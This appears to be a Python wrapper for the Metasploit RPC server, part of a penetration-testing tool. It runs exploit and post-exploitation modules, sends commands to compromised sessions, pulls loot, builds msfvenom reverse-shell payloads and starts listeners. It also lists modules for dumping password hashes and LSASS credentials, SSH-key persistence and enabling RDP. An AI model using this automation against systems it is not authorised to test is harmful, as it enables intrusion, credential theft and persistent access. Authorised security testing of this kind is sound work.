"""
Metasploit RPC client wrapper.
Connects to msfrpcd via pymetasploit3.
All methods return None / empty gracefully if MSF is not available.
"""

import logging
from typing import Optional
import re

logger = logging.getLogger(__name__)

_client = None
_connected = False


def get_client():
    global _client, _connected
    return _client if _connected else None


def connect(host: str = "127.0.0.1", port: int = 55553, password: str = "", ssl: bool = False) -> tuple[bool, str]:
    import os
    password = password or os.getenv("MSF_RPC_PASSWORD", "")
    global _client, _connected
    try:
        from pymetasploit3.msfrpc import MsfRpcClient
        _client = MsfRpcClient(password, server=host, port=port, ssl=ssl)
        _connected = True
        logger.info(f"Connected to Metasploit RPC at {host}:{port}")
        return True, ""
    except Exception as e:
        logger.warning(f"Could not connect to Metasploit RPC: {e}")
        _connected = False
        _client = None
        return False, str(e)


def disconnect():
    global _client, _connected
    _client = None
    _connected = False


def get_status() -> dict:
    client = get_client()
    if not client:
        return {"connected": False, "version": None, "sessions": 0, "jobs": 0}
    try:
        version = client.core.version
        sessions = client.sessions.list
        jobs = client.jobs.list
        return {
            "connected": True,
            "version": version.get("version", "unknown") if isinstance(version, dict) else str(version),
            "ruby_version": version.get("ruby", "unknown") if isinstance(version, dict) else "unknown",
            "sessions": len(sessions) if isinstance(sessions, dict) else 0,
            "jobs": len(jobs) if isinstance(jobs, dict) else 0,
        }
    except Exception as e:
        logger.warning(f"MSF status error: {e}")
        return {"connected": False, "version": None, "sessions": 0, "jobs": 0}


def list_sessions() -> list[dict]:
    client = get_client()
    if not client:
        return []
    try:
        sessions = client.sessions.list
        result = []
        for sid, info in sessions.items():
            result.append({
                "msf_session_id": str(sid),
                "session_type": info.get("type", "shell"),
                "tunnel_peer": info.get("tunnel_peer", ""),
                "tunnel_local": info.get("tunnel_local", ""),
                "via_exploit": info.get("via_exploit", ""),
                "via_payload": info.get("via_payload", ""),
                "arch": info.get("arch", ""),
                "platform": info.get("platform", ""),
                "remote_host": info.get("tunnel_peer", "").split(":")[0] if ":" in info.get("tunnel_peer", "") else info.get("tunnel_peer", ""),
                "remote_port": info.get("tunnel_peer", "").split(":")[1] if ":" in info.get("tunnel_peer", "") else "",
                "info": info.get("info", ""),
            })
        return result
    except Exception as e:
        logger.warning(f"MSF list_sessions error: {e}")
        return []


def list_jobs() -> list[dict]:
    client = get_client()
    if not client:
        return []
    try:
        jobs = client.jobs.list
        result = []
        for jid, info in jobs.items():
            result.append({
                "job_id": str(jid),
                "name": info.get("name", ""),
                "started_at": info.get("started_at", ""),
                "datastore": info.get("datastore", {}),
            })
        return result
    except Exception as e:
        logger.warning(f"MSF list_jobs error: {e}")
        return []


def stop_job(job_id: str) -> bool:
    client = get_client()
    if not client:
        return False
    try:
        client.jobs.stop(job_id)
        return True
    except Exception as e:
        logger.warning(f"MSF stop_job error: {e}")
        return False


def run_module(module_path: str, options: dict, payload: str = "") -> dict:
    """Run an exploit/auxiliary/post module and return job_id + any new session."""
    import time, threading
    client = get_client()
    if not client:
        return {"error": "Not connected to Metasploit"}
    try:
        # Infer type from path prefix
        if module_path.startswith("exploit/"):
            mod_type, mod_name = "exploit", module_path[len("exploit/"):]
        elif module_path.startswith("auxiliary/"):
            mod_type, mod_name = "auxiliary", module_path[len("auxiliary/"):]
        elif module_path.startswith("post/"):
            mod_type, mod_name = "post", module_path[len("post/"):]
        else:
            return {"error": f"Cannot determine module type from path: {module_path}"}

        mod = client.modules.use(mod_type, mod_name)

        # Payload options cannot be set on the module object — pass them to execute() as kwargs
        _PAYLOAD_OPTIONS = {"LHOST", "LPORT", "LURI", "EXITFUNC", "RHOST"}
        module_opts = {}
        execute_opts = {}
        for key, val in options.items():
            if isinstance(val, str) and val.lower() in ("true", "false"):
                val = val.lower() == "true"
            if key in _PAYLOAD_OPTIONS:
                execute_opts[key] = val
            else:
                module_opts[key] = val

        for key, val in module_opts.items():
            if key == "SESSION" and isinstance(val, str):
                val = int(val)
            mod[key] = val

        sessions_before = set(client.sessions.list.keys()) if isinstance(client.sessions.list, dict) else set()

        if payload and mod_type == "exploit":
            result = mod.execute(payload=payload, **execute_opts)
        else:
            result = mod.execute(**execute_opts)

        logger.info(f"MSF execute result for {module_path}: {result}")

        if isinstance(result, dict) and result.get("error"):
            return {"error": result.get("error_message") or result.get("error_string") or str(result)}

        job_id = result.get("job_id") if isinstance(result, dict) else None
        uuid = result.get("uuid") if isinstance(result, dict) else None

        # Post modules: run via MSF console to reliably capture output
        if mod_type == "post":
            # Stop the background job we just started — we'll re-run via console
            if job_id is not None:
                try:
                    client.jobs.stop(str(job_id))
                except Exception:
                    pass

            output = ""
            con = None
            try:
                con = client.consoles.console()
                time.sleep(0.5)
                con.read()  # flush banner

                session_id = options.get("SESSION", "")
                con.write(f"use {module_path}\n")
                time.sleep(0.3)
                con.read()

                for k, v in options.items():
                    con.write(f"set {k} {v}\n")
                    time.sleep(0.1)
                con.read()

                con.write("run\n")

                # Read until prompt returns (module finished) — up to 5 min
                buf = ""
                deadline = time.time() + 300
                idle_ticks = 0
                while time.time() < deadline:
                    time.sleep(1)
                    chunk = con.read()
                    data = chunk.get("data", "") if isinstance(chunk, dict) else ""
                    buf += data
                    busy = chunk.get("busy", True) if isinstance(chunk, dict) else True
                    if not busy:
                        idle_ticks += 1
                        if idle_ticks >= 2:
                            break
                    else:
                        idle_ticks = 0
                output = buf.strip()
            except Exception as e:
                logger.warning(f"Console run error for {module_path}: {e}")
            finally:
                if con is not None:
                    try:
                        con.destroy()
                    except Exception:
                        pass

            new_sids = [sid for sid in (client.sessions.list or {}) if sid not in sessions_before]
            return {
                "job_id": None,
                "output": output or None,
                "new_session_id": str(new_sids[0]) if new_sids else None,
                "msf_result": result,
            }

        # Exploit/auxiliary: poll for new sessions
        new_sids_list: list = []
        done = threading.Event()

        def _poll():
            deadline = time.time() + 4
            while time.time() < deadline:
                time.sleep(0.3)
                try:
                    after = client.sessions.list
                    if isinstance(after, dict):
                        found = [sid for sid in after if sid not in sessions_before]
                        if found:
                            new_sids_list.extend(found)
                            break
                except Exception:
                    pass
            done.set()

        threading.Thread(target=_poll, daemon=True).start()
        done.wait(timeout=5)

        sessions_after = client.sessions.list if isinstance(client.sessions.list, dict) else {}
        new_session = sessions_after.get(new_sids_list[0]) if new_sids_list else None
        logger.info(f"MSF run complete — new sessions: {new_sids_list}")

        return {
            "job_id": str(job_id) if job_id is not None else None,
            "new_session_id": str(new_sids_list[0]) if new_sids_list else None,
            "new_session": new_session,
            "msf_result": result,
        }
    except Exception as e:
        logger.warning(f"MSF run_module error: {e}")
        return {"error": str(e)}


def session_run_command(msf_session_id: str, command: str, timeout: int = 30) -> str:
    """Run a command in a shell/meterpreter session and return output."""
    client = get_client()
    if not client:
        return "[Error] Not connected to Metasploit"

    # Validate command — no shell injection beyond what MSF handles natively
    command = command.strip()
    if not command:
        return ""

    try:
        import time
        session = client.sessions.session(msf_session_id)
        if type(session).__name__ == 'MeterpreterSession':
            output = session.run_with_output(command, timeout=timeout)
        else:
            # Shell session — write command, then read with retries
            session.write(command + "\n")
            output = ""
            deadline = time.time() + timeout
            while time.time() < deadline:
                time.sleep(0.4)
                chunk = session.read()
                if chunk:
                    output += chunk
                    # Keep reading briefly to catch remaining output
                    time.sleep(0.3)
                    tail = session.read()
                    if tail:
                        output += tail
                    break
        return output or ""
    except Exception as e:
        logger.warning(f"MSF session_run_command error: {e}")
        return f"[Error] {e}"


def kill_session(msf_session_id: str) -> bool:
    client = get_client()
    if not client:
        return False
    try:
        client.sessions.session(msf_session_id).stop()
        return True
    except Exception as e:
        logger.warning(f"MSF kill_session error: {e}")
        return False


def get_loot(msf_session_id: str = None) -> list[dict]:
    """Pull loot from Metasploit DB."""
    client = get_client()
    if not client:
        return []
    try:
        # MSF loot via db.loots RPC call
        loot = client.call("db.loots", [{}])
        if isinstance(loot, dict) and "loots" in loot:
            items = []
            for l in loot["loots"]:
                items.append({
                    "loot_type": l.get("ltype", "unknown"),
                    "name": l.get("name", ""),
                    "content_type": l.get("content_type", ""),
                    "path": l.get("path", ""),
                    "data": l.get("data", ""),
                    "host": l.get("host", ""),
                    "service": l.get("service_id", ""),
                    "info": l.get("info", ""),
                    "created_at": str(l.get("created_at", "")),
                })
            return items
        return []
    except Exception as e:
        logger.warning(f"MSF get_loot error: {e}")
        return []


def generate_payload(
    payload: str,
    lhost: str,
    lport: int,
    fmt: str = "elf",
    arch: str = "x86_64",
    platform: str = "linux",
    extra_opts: dict = None,
) -> bytes | None:
    """
    Generate a payload using msfvenom via subprocess.
    Returns raw bytes of the payload, or None on error.
    Uses subprocess with a fixed argument list — no shell=True.
    """
    import subprocess
    import shutil
    import re

    if not shutil.which("msfvenom"):
        return None

    # Validate inputs strictly
    if not re.match(r'^[\w/]+$', payload):
        raise ValueError("Invalid payload name")
    if not re.match(r'^[\w\.\-]+$', lhost):
        raise ValueError("Invalid LHOST")
    if not (1 <= lport <= 65535):
        raise ValueError("Invalid LPORT")
    allowed_formats = {"elf", "exe", "raw", "python", "bash", "php", "asp", "aspx", "jar", "psh", "macho", "dll", "apk"}
    if fmt not in allowed_formats:
        raise ValueError(f"Invalid format: {fmt}")
    allowed_arches = {"x86", "x86_64", "x64", "arm", "aarch64", "mipsle", "mipsbe"}
    if arch not in allowed_arches:
        raise ValueError(f"Invalid arch: {arch}")

    cmd = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={str(lport)}",
        "-f", fmt,
        "-a", arch,
        "--platform", platform,
    ]

    if extra_opts:
        for k, v in extra_opts.items():
            if re.match(r'^\w+$', str(k)) and re.match(r'^[\w\.\-:/]+$', str(v)):
                cmd.append(f"{k}={v}")

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            timeout=60,
        )
        if result.returncode == 0:
            return result.stdout
        logger.warning(f"msfvenom error: {result.stderr.decode()}")
        return None
    except Exception as e:
        logger.warning(f"msfvenom subprocess error: {e}")
        return None


def start_listener(payload: str, lhost: str, lport: int, extra_opts: dict = None) -> dict:
    """Start a multi/handler listener for the given payload."""
    client = get_client()
    if not client:
        return {"error": "Not connected to Metasploit"}

    # Validate
    import re
    if not re.match(r'^[\w/]+$', payload):
        return {"error": "Invalid payload"}
    if not re.match(r'^[\w\.\-]+$', lhost):
        return {"error": "Invalid LHOST"}
    if not (1 <= lport <= 65535):
        return {"error": "Invalid LPORT"}

    try:
        exploit = client.modules.use("exploit", "multi/handler")
        exploit["PAYLOAD"] = payload
        exploit["LHOST"] = lhost
        exploit["LPORT"] = lport
        if extra_opts:
            for k, v in (extra_opts or {}).items():
                if re.match(r'^\w+$', str(k)):
                    exploit[k] = v
        result = exploit.execute(payload=payload)
        return {"result": result, "job_id": result.get("job_id")}
    except Exception as e:
        logger.warning(f"MSF start_listener error: {e}")
        return {"error": str(e)}


# Common post-exploitation modules
POST_MODULES = {
    "linux": [
        {"name": "post/multi/recon/local_exploit_suggester", "label": "Local Exploit Suggester", "description": "Find local privilege escalation exploits"},
        {"name": "post/linux/gather/hashdump", "label": "Hash Dump", "description": "Dump /etc/shadow hashes"},
        {"name": "post/linux/gather/enum_system", "label": "System Enumeration", "description": "Enumerate system info, users, services"},
        {"name": "post/linux/gather/enum_network", "label": "Network Enumeration", "description": "Enumerate network interfaces and connections"},
        {"name": "post/linux/manage/sshkey_persistence", "label": "SSH Key Persistence", "description": "Add SSH key for persistence"},
        {"name": "post/multi/gather/env", "label": "Environment Variables", "description": "Dump environment variables"},
    ],
    "windows": [
        {"name": "post/multi/recon/local_exploit_suggester", "label": "Local Exploit Suggester", "description": "Find local privilege escalation exploits"},
        {"name": "post/windows/gather/hashdump", "label": "Hash Dump (LSASS)", "description": "Dump NTLM hashes from LSASS"},
        {"name": "post/windows/gather/credentials/credential_collector", "label": "Credential Collector", "description": "Collect stored credentials"},
        {"name": "post/windows/gather/enum_system", "label": "System Enumeration", "description": "Enumerate system info and config"},
        {"name": "post/windows/manage/enable_rdp", "label": "Enable RDP", "description": "Enable Remote Desktop Protocol"},
        {"name": "post/windows/gather/enum_logged_on_users", "label": "Logged On Users", "description": "List currently logged on users"},
        {"name": "post/multi/manage/shell_to_meterpreter", "label": "Shell → Meterpreter", "description": "Upgrade shell to Meterpreter"},
    ],
    "multi": [
        {"name": "post/multi/manage/shell_to_meterpreter", "label": "Shell → Meterpreter", "description": "Upgrade shell session to Meterpreter"},
        {"name": "post/multi/gather/env", "label": "Environment Variables", "description": "Dump environment variables"},
        {"name": "post/multi/recon/local_exploit_suggester", "label": "Local Exploit Suggester", "description": "Suggest local privilege escalation exploits"},
    ],
}
